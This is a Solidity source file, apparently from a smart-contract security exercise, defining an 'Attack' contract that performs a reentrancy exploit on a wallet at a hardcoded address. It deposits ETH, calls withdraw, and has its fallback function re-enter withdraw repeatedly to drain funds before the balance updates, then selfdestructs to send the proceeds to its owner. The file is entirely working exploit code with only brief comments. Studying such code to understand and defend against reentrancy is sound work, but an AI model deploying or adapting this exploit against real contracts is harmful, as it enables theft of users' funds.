pragma solidity >=0.8.0;
import "../contracts/Wallet.sol";

contract Ownable {
    address owner;
    constructor() { owner = msg.sender; }
    
    // reverts if sender of message is not owner
    modifier onlyOwner {
        require(msg.sender == owner, "only owner");
        _; // following code will be inserted here
    }
}

contract Attack is Ownable {
    address constant walletAddress = 0x9790831d13a49CF9BF62271D4aa5CfaC41CB0B0B;
    Wallet public wallet = Wallet(walletAddress);
    uint8 public counter = 5; // counter for limiting recursion

    // send ETH to the vulnerable wallet
    function depositToWallet(uint amount) public onlyOwner {
        wallet.deposit{value: amount}();
    }

    // call the withdraw function of the vulnerable wallet
    function withdrawFromWallet() public onlyOwner {
        counter--;
        wallet.withdraw();
    }

    function resetCounter() public onlyOwner {
        counter = 5;
    }

    function depositOwner() public payable {
        require(msg.sender == owner);
    }

    fallback() external payable {
        if(counter > 0) {
            counter--;
            wallet.withdraw();
        }
    }

    function close() public onlyOwner {
        selfdestruct(payable(owner));
    }
}